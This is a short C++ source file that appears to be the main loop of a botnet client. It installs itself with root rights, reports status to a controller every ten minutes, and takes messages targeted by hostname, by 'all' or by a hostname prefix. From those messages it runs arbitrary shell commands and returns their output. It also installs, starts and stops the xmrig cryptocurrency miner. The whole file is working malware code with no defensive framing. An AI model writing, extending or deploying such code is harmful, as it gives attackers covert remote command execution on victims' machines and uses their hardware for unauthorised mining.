#include "worker_utils.h"
#include <chrono>
#include <thread>

void send_status(Worker_utils *worker)
{
    while(true)
    {
        worker->sendStatus();
        std::this_thread::sleep_for(std::chrono::minutes(10));
    }
}

int main()
{
    Worker_utils worker;

    // Installation
    if (!worker.isInstalled())
        worker.install("root");

    std::thread status_thread(send_status, &worker);

    std::vector<std::string> msgs;
    while (true)
    {
        worker.receive(msgs);
        std::string hostname = exec("hostname");
        if (msgs[0] == hostname || msgs[0] == "all" || (msgs[0] == "114" && hostname[0] == 'S' && hostname[1] == 'M'))
        {
            if (msgs[1] == "cmd")
            {
                std::string answ = exec(msgs[2].c_str());
                worker.send(answ);
            }
            else if (msgs[1] == "set msg count")
            {
                worker.setReceiveMsgCnt(std::stoi(msgs[2]));
            }
            else if (msgs[1] == "ver")
            {
                worker.send(VERSION);
            }
            else if (msgs[1] == "inst xmrig")
            {
                worker.instXmrig();
            }
            else if (msgs[1] == "run xmrig")
            {
                worker.runXmrig();
            }
            else if (msgs[1] == "stop xmrig")
            {
                worker.stopXmrig();
            }
        }
    }

    status_thread.join();
    return 0;
}
